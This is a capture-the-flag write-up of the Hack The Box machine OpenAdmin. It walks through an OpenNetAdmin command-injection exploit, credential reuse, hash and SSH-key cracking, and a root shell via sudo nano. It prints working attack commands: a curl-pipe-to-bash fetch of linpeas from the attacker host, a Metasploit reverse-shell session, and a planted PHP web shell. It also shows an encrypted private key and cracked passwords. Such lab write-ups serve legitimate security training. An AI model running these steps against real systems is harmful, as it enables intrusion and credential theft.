---
permalink: /posts/HTB/OpenAdmin
title:  "HTB OpenAdmin"
author: Luc Kolen
description: "OpenAdmin is an easy Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Easy
  - Linux
  - Gobuster
  - OpenNetAdmin
  - Hydra
  - Hashcat
  - John
---
# 10.10.10.171 - OpenAdmin

- [10.10.10.171 - OpenAdmin](#101010171---openadmin)
  - [Open ports](#open-ports)
  - [HTTP](#http)
    - [Music](#music)
  - [Privilege escalation](#privilege-escalation)
    - [www-data -> jimmy](#www-data---jimmy)
  - [Joanna -> root](#joanna---root)
  - [TL;DR](#tldr)
  - [Bonus](#bonus)
    - [OpenNetAdmin via Metasploit](#opennetadmin-via-metasploit)
    - [Joanna's SSH key without cracking the internal password hash](#joannas-ssh-key-without-cracking-the-internal-password-hash)

## Open ports

```bash
luc@kali:~/HTB/OpenAdmin$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.171
```

|Port|Service|Version
|---|---|---|
22/tcp|ssh|OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp|http|Apache httpd 2.4.29 ((Ubuntu))

## HTTP

`http://10.10.10.171/` shows the Apache2 Ubuntu Default Page.

```bash
luc@kali:~/OpenAdmin$ gobuster dir -u http://10.10.10.171 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp"
...
/index.html (Status: 200)
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
```

We get 3 different directories, `music`, `artwork` and `sierra`.

### Music

Browsing to this page `http://10.10.10.171/music/` shows a webpage with a `Login` link which brings us to `http://10.10.10.171/ona/`.

```text
You are NOT on the latest release version
Your version    = v18.1.1
Latest version = Unable to determine

Please DOWNLOAD the latest version.
```

This page notifies us that we're on an old version and we get a download link to `https://opennetadmin.com/download.html`.

```bash
luc@kali:~/OpenAdmin$ searchsploit opennetadmin
...
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)    | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                     | php/webapps/47691.sh
...
luc@kali:~/OpenAdmin$ searchsploit -m php/webapps/47691.sh
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /usr/share/exploitdb/exploits/php/webapps/47691.sh
File Type: ASCII text, with CRLF line terminators

Copied to: /home/luc/OpenAdmin/47691.sh
```

We can see that `OpenNetAdmin 18.1.1` is vulnerable to `remote code execution`. We'll use the one that doesn't use Metasploit here, [Bonus](#bonus) will take a look at the version that does use Metasploit in [OpenNetAdmin via Metasploit](#opennetadmin-via-metasploit).

```bash
luc@kali:~/OpenAdmin$ ./47691.sh http://10.10.10.171/ona/
./47691.sh: line 8: $'\r': command not found
./47691.sh: line 16: $'\r': command not found
./47691.sh: line 18: $'\r': command not found
./47691.sh: line 23: syntax error near unexpected token `done'
./47691.sh: line 23: `done'
luc@kali:~/OpenAdmin$ dos2unix 47691.sh
dos2unix: converting file 47691.sh to Unix format...
luc@kali:~/OpenAdmin$ ./47691.sh http://10.10.10.171/ona/
$ whoami
www-data
```

Our first attempt to run this exploit shows an error because the file isn't using the correct line endings. `dos2unix` fixes that issue and now we can use the exploit.

## Privilege escalation

### www-data -> jimmy

```bash
luc@kali:~/OpenAdmin$ ./47691.sh http://10.10.10.171/ona/
$ ls -R /home
/home:
jimmy
joanna
$ cat /etc/passwd | grep -v -e false -e nologin -e sync
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

We don't have access to any of the home directories yet

```bash
$ wget http://10.10.14.9:8000/linpeas.sh
$ chmod +x linpeas.sh
$ curl http://10.10.14.9:8000/linpeas.sh | bash > linpeas.result
```

```bash
luc@kali:~/OpenAdmin$ wget http://10.10.10.171/ona/linpeas.result
luc@kali:~/OpenAdmin$ less -R linpeas.result
...
/var/www/html/ona/local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!',
...
```

We can run `linpeas.sh` on this server and by saving the file we can download it via `http://10.10.10.171/ona/linpeas.result`. We can see that `n1nj4W4rri0R!` was used as the database password.

```bash
luc@kali:~/OpenAdmin$ printf 'jimmy\njoanna' > users.txt
luc@kali:~/OpenAdmin$ hydra -L users.txt -p 'n1nj4W4rri0R!' ssh://10.10.10.171
...
[22][ssh] host: 10.10.10.171   login: jimmy   password: n1nj4W4rri0R!
...
luc@kali:~/OpenAdmin$ ssh jimmy@10.10.10.171
jimmy@10.10.10.171's password: n1nj4W4rri0R!
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 25 10:41:02 UTC 2020

  System load:  0.0               Processes:             111
  Usage of /:   58.9% of 7.81GB   Users logged in:       0
  Memory usage: 50%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jun 25 10:36:06 2020 from 10.10.14.9
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

We have one password and two usernames so we could've tried them ourselves instead of using `hydra`.

```bash
jimmy@openadmin:/home$ ls -R
.:
jimmy  joanna

./jimmy:
ls: cannot open directory './joanna': Permission denied
```

We're logged in as Jimmy via SSH, but we still don't have access to a user.txt file.

```bash
jimmy@openadmin:/var/www$ ls
html  internal  ona
jimmy@openadmin:/var/www$ cd internal/
jimmy@openadmin:/var/www/internal$ ls
index.php  logout.php  main.php
jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
jimmy@openadmin:/var/www/internal$ cat index.php
...
if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
...
```

```bash
luc@kali:~/OpenAdmin$ echo '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1' > hash
luc@kali:~/OpenAdmin$ hashcat --example-hashes
...
MODE: 1700
TYPE: SHA2-512
HASH: 82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f
PASS: hashcat
...
luc@kali:~/OpenAdmin$ hashcat -m 1700 hash /usr/share/seclists/Passwords/dutch_common_wordlist.txt
...
00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1:Revealed
...
```

This hash could've also been cracked by using [CrackStation](https://crackstation.net/).

```bash
jimmy@openadmin:/var/www/internal$ cat /etc/apache2/sites-available/internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

We can see that this website is listening on `127.0.0.1:52846`.

```bash
jimmy@openadmin:/var/www/internal$ curl -d 'username=jimmy&password=Revealed' http://127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

We know have the encrypted key for Joanna.

```bash
luc@kali:~/OpenAdmin$ /usr/share/john/ssh2john.py joanna_id_rsa > joanna_john
luc@kali:~/OpenAdmin$ john --wordlist=/usr/share/wordlists/rockyou.txt joanna_john
...
bloodninjas
...
luc@kali:~/OpenAdmin$ chmod 600 joanna_id_rsa
luc@kali:~/OpenAdmin$ ssh joanna@10.10.10.171 -i joanna_id_rsa
load pubkey "joanna_id_rsa": invalid format
Enter passphrase for key 'joanna_id_rsa': bloodninjas
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 25 12:16:02 UTC 2020

  System load:  0.0               Processes:             113
  Usage of /:   59.2% of 7.81GB   Users logged in:       1
  Memory usage: 47%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
joanna@openadmin:~$ ls
user.txt
joanna@openadmin:~$ cat user.txt
c9b2cf07************************
```

We've cracked the password for the `id_rsa` file and we got a successful SSH connection. We can also read the `user.txt` file.

## Joanna -> root

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$ sudo /bin/nano /opt/priv
```

```text
^R^X
reset; sh 1>&0 2>&0
```

```bash
# clear
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
2f907ed4************************
```

We can check [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#shell) to see how we can get a shell from `Nano`. This shell will execute as the same privileges we had while running `Nano` and that's `root` because we can `sudo` this application without a password.

## TL;DR

- Gobuster finds `/music` which has a login button go to `/ona`
- OpenNetAdmin V18.1.1 is vulnerable to Remote Code Execution
- Config file shows password for Jimmy
- Access to `/var/www/internal` which is a website showing Joanna's SSH key and we can read the password hash
- Crack the password hash to see Joanna's SSH key
- Joanna can run `Nano` as root

## Bonus

### OpenNetAdmin via Metasploit

```bash
luc@kali:~/OpenAdmin$ sudo msfdb init && msfconsole -q
[i] Database already started
[i] The database appears to be already configured, skipping initialization
-----------------------------------------------------------------------------------
The pg and/or activerecord gem version has changed, meaning deprecated pg constants
may no longer be in use, so try deleting this file to see if the
'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
/usr/share/metasploit-framework/lib/pg/deprecated_constants.rb
-----------------------------------------------------------------------------------

msf5 > search opennetadmin

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection

msf5 > use exploit/unix/webapp/opennetadmin_ping_cmd_injection
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set payload linux/x64/meterpreter/reverse_tcp
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set RHOSTS 10.10.10.171
RHOSTS => 10.10.10.171
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set LHOST tun0
LHOST => 10.10.14.9
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > run

[*] Started reverse TCP handler on 10.10.14.9:4444
[*] Exploiting...
[*] Sending stage (3012516 bytes) to 10.10.10.171
[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.171:47948) at 2020-06-25 15:14:05 +0200
[*] Command Stager progress - 100.00% done (808/808 bytes)

meterpreter > shell
Process 8821 created.
Channel 1 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Joanna's SSH key without cracking the internal password hash

```bash
jimmy@openadmin:/var/www/internal$ echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/shell.php?cmd=id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```

`Jimmy` has write access in `/var/www/internal` and this is running as the user `Joanna`.

```bash
jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/shell.php?cmd=cat+/home/joanna/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

We can use this to read `id_rsa` instead of logging in via the internal website.
